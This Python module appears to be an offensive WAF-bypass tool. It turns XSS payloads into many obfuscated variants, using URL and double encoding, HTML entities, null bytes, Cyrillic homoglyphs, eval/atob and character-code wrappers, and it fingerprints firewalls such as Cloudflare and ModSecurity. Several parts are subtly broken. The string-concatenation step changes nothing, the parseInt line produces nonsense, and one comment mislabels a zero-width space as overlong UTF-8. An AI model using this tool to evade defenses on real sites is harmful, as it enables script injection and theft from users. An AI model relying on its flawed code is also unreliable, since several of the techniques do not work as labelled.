#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF Bypass Techniques
Advanced encoding and obfuscation methods
"""

import random
import base64
import html
from typing import List

class WAFBypass:
    """Web Application Firewall Bypass Techniques"""
    
    def __init__(self):
        self.techniques = self._load_techniques()
        
    def _load_techniques(self) -> dict:
        """Load WAF bypass techniques"""
        return {
            'case_variation': self._case_variation,
            'encoding': self._encoding_bypass,
            'comment_insertion': self._comment_insertion,
            'null_byte': self._null_byte,
            'double_encoding': self._double_encoding,
            'unicode': self._unicode_bypass,
            'concatenation': self._string_concatenation,
            'alternative_syntax': self._alternative_syntax,
            'obfuscation': self._obfuscation,
        }
    
    def encode_payload(self, payload: str) -> List[str]:
        """Apply all bypass techniques to payload"""
        encoded = [payload]  # Original
        
        for name, technique in self.techniques.items():
            try:
                result = technique(payload)
                if isinstance(result, list):
                    encoded.extend(result)
                else:
                    encoded.append(result)
            except:
                continue
        
        return list(set(encoded))
    
    def _case_variation(self, payload: str) -> str:
        """Random case variation"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
    
    def _encoding_bypass(self, payload: str) -> List[str]:
        """Various encoding techniques"""
        encoded = []
        
        # URL encoding
        encoded.append(''.join(f'%{ord(c):02x}' for c in payload))
        
        # Double URL encoding
        single = ''.join(f'%{ord(c):02x}' for c in payload)
        encoded.append(single.replace('%', '%25'))
        
        # HTML entities
        encoded.append(html.escape(payload))
        
        # Hex entities
        encoded.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # Decimal entities
        encoded.append(''.join(f'&#{ord(c)};' for c in payload))
        
        return encoded
    
    def _comment_insertion(self, payload: str) -> str:
        """Insert HTML comments"""
        # Insert comments between tag characters
        result = payload.replace('<', '<!-- -->')
        result = result.replace('>', '<!-- -->')
        return result
    
    def _null_byte(self, payload: str) -> str:
        """Null byte injection"""
        return payload.replace('<', '%00<').replace('>', '%00>')
    
    def _double_encoding(self, payload: str) -> str:
        """Double encoding"""
        first = ''.join(f'%{ord(c):02x}' for c in payload)
        return first.replace('%', '%25')
    
    def _unicode_bypass(self, payload: str) -> List[str]:
        """Unicode normalization bypasses"""
        encoded = []
        
        # Unicode homoglyphs
        homoglyphs = {
            'a': '\u0430',  # Cyrillic а
            'e': '\u0435',  # Cyrillic е
            'o': '\u043e',  # Cyrillic о
            'p': '\u0440',  # Cyrillic р
            'c': '\u0441',  # Cyrillic с
            'x': '\u0445',  # Cyrillic х
            'y': '\u0443',  # Cyrillic у
        }
        
        result = ""
        for char in payload:
            result += homoglyphs.get(char.lower(), char)
        encoded.append(result)
        
        # Overlong UTF-8 (theoretical)
        encoded.append(payload.replace('script', 'scr\u200bipt'))
        
        return encoded
    
    def _string_concatenation(self, payload: str) -> str:
        """JavaScript string concatenation"""
        # Break up keywords
        replacements = {
            'alert': 'al'+'ert',
            'script': 'scr'+'ipt',
            'document': 'doc'+'ument',
            'cookie': 'coo'+'kie',
            'location': 'loc'+'ation',
            'eval': 'ev'+'al',
            'fromCharCode': 'from'+'Char'+'Code',
        }
        
        result = payload
        for original, replacement in replacements.items():
            result = result.replace(original, replacement)
        
        return result
    
    def _alternative_syntax(self, payload: str) -> List[str]:
        """Alternative JavaScript syntax"""
        alternatives = []
        
        # Template literals
        alternatives.append(payload.replace("'", "`").replace('"', "`"))
        
        # Bracket notation
        alternatives.append(payload.replace('.cookie', "['cookie']"))
        alternatives.append(payload.replace('.domain', "['domain']"))
        
        # Constructor access
        alternatives.append(payload.replace('alert', "window['alert']"))
        alternatives.append(payload.replace('alert', "self['alert']"))
        alternatives.append(payload.replace('alert', "top['alert']"))
        alternatives.append(payload.replace('alert', "this['alert']"))
        
        # Using eval with string
        if 'alert' in payload:
            alternatives.append(f"eval(atob('{base64.b64encode(b'alert(1)').decode()}'))")
        
        return alternatives
    
    def _obfuscation(self, payload: str) -> List[str]:
        """Advanced obfuscation"""
        obfuscated = []
        
        # Character code obfuscation
        if 'alert' in payload:
            obfuscated.append(payload.replace(
                'alert(1)', 
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
            ))
        
        # Base64 obfuscation
        if '<script>' in payload:
            b64 = base64.b64encode(b"alert(1)").decode()
            obfuscated.append(f"<script>eval(atob('{b64}'))</script>")
        
        # Hex escape sequences
        hex_escapes = ''.join(f'\\x{ord(c):02x}' for c in "alert(1)")
        obfuscated.append(f"<script>eval('{hex_escapes}')</script>")
        
        # Unicode escapes
        unicode_escapes = ''.join(f'\\u{ord(c):04x}' for c in "alert(1)")
        obfuscated.append(f"<script>eval('{unicode_escapes}')</script>")
        
        # Octal escapes
        octal_escapes = ''.join(f'\\{ord(c):03o}' for c in "alert(1)")
        obfuscated.append(f"<script>eval('{octal_escapes}')</script>")
        
        # Mixed encoding
        mixed = "al\\u0065rt(1)"
        obfuscated.append(payload.replace('alert(1)', mixed))
        
        # Using parseInt
        obfuscated.append("eval(parseInt('616c657274283129',16).toString(8))")
        
        return obfuscated
    
    def detect_waf(self, response_headers: dict, response_body: str) -> str:
        """Detect WAF type from response"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
            'AWS WAF': ['awselb', 'aws-waf'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Akamai': ['akamai', 'akamaighost'],
            'F5 BIG-IP': ['bigip', 'f5'],
            'Barracuda': ['barra'],
            'Citrix': ['citrix'],
            'DenyAll': ['denyall'],
            'Fortinet': ['fortigate', 'fortiweb'],
            'Imperva': ['incap_ses', 'visid_incap'],
            'Wordfence': ['wordfence'],
        }
        
        combined = str(response_headers).lower() + response_body.lower()
        
        for waf, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in combined:
                    return waf
        
        return "Unknown"
